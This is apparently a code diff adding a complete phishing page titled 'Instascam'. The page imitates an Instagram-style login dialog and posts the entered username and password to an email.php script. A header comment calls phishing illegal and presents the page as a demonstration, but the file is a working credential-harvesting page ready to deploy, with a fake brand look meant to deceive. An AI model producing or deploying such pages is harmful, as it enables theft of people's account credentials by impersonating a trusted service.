@@ -1,0 +1,154 @@
+<!--
+Phishing is very illegal!
+Please do not use this in any way that will get you in trouble.
+This is just to demonstrate how easily you can create a site that looks like a popular trusted site 
+-->
+
+<!DOCTYPE html>
+<html >
+<head>
+  <meta charset="UTF-8">
+  <title>Instascam</title>
+
+<style>
+body {
+  background-color: #F5F5Fc;
+  font-family: 'proxima-nova', 'Helvetica Neue', Arial, Helvetica, sans-serif;
+  line-height: 20px;
+  color: #222;
+  font-size: 14px;
+  font-weight: 700;
+}
+.dialog-header {
+  background-image: -webkit-linear-gradient(top, #517fa4, #306088);
+  box-shadow: 0 -1px 0 #06365f inset, 0 1px 0 rgba(255, 255, 255, 0.2) inset;
+  background-color: #517fa4;
+  height: 44px;
+  border: 1px solid #1c5380;
+  border-bottom-width: 0px;
+  border-radius: 4px 4px 0 0;
+}
+.dialog-logo {
+  position: relative;
+   background: url('logo.png') no-repeat 0 0;
+  background-size: 100px 32px;
+  background-position: 50% 50%;
+  width: 96px;
+  height: 33px;
+  margin: 10px auto;
+}
+.dialog {
+  width: 400px;
+  margin: 0 auto;
+}
+.dialog-body {
+  background: #fff;
+  border: 1px solid #a4baca;
+  border-top-width: 0px;
+  border-radius: 0 0  4px 4px;
+  padding-top: 30px;
+  padding-right: 20px;
+  padding-bottom: 40px;
+}
+.login-label {
+  float: left;
+  width: 35%;
+  padding-top: 5px;
+  padding-right: 10px;
+  margin: 0 0px 5px;
+  text-align: center;
+}
+.login-input {
+  margin: 0 5px;
+  display: inline;
+}
+input {
+  border: 1px solid #ccc;
+  line-height: 16px;
+  border-radius: 3px;
+  width: 55%;
+  padding: 9px 8px 7px;
+}
+input:active {
+  background: #000000;
+}
+.login-block {
+  margin-bottom: 15px;
+}
+.login-footer {;
+  margin-top: 25px;
+}
+.forgot-link {
+  position: relative;
+  margin-left: 30px;
+  top: 5px;
+  display: inline;
+}
+.forgot-link a {
+  font-weight: 500;
+  text-decoration: none;
+}
+a:hover {
+  color: #1c5380;
+  text-decoration: underline;
+}
+a, a:visited {
+  color: #3f729b;
+}
+#login-btn {
+  font-weight: bold;
+  padding: 7px 10px 8px;
+  color: #FFF;
+  border-radius: 3px;
+  display: inline;
+  border: 1px solid #3d8b5f;
+      background-color: #6bb38a;
+    background-image: -webkit-gradient(linear, left top, left bottom, from(#6bb38a), to(#3d8b5f));
+    background-image: -webkit-linear-gradient(top, #6bb38a, #3d8b5f);
+  text-shadow: 0 1px 1px #1e693f;
+  cursor: pointer;
+}
+#login {
+  display: inline;
+  float: right;
+  margin-right: 5px;
+}
+
+</style>
+</head>
+
+<body>
+  <div class='dialog'>
+    <div class='dialog-header'>
+      <div class='dialog-logo'></div>
+    </div>
+    <div class='dialog-body'>
+      <div class='login-block'>
+        <div class='login-label'>
+          <form method="post" action="email.php">
+          Username:
+        </div>
+        <div class='login-input'>
+          <input type='text' id='username' name="username"></input>
+        </div>
+      </div>
+      <div class='login-block'>
+        <div class='login-label'>
+          Password:
+      </div>
+      <div class='login-input'>
+        <input type='text' id='password' name="password"></input>
+      </div>
+    </div>
+    <div class='login-footer'>
+      <div class='forgot-link'>
+        <a href="#">Forgot password?</a>
+      </div>
+      <div id='login'>
+        <button id='login-btn' type="submit" name="submit" value="Submit" class="submit-button">Log in</button>
+      </div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
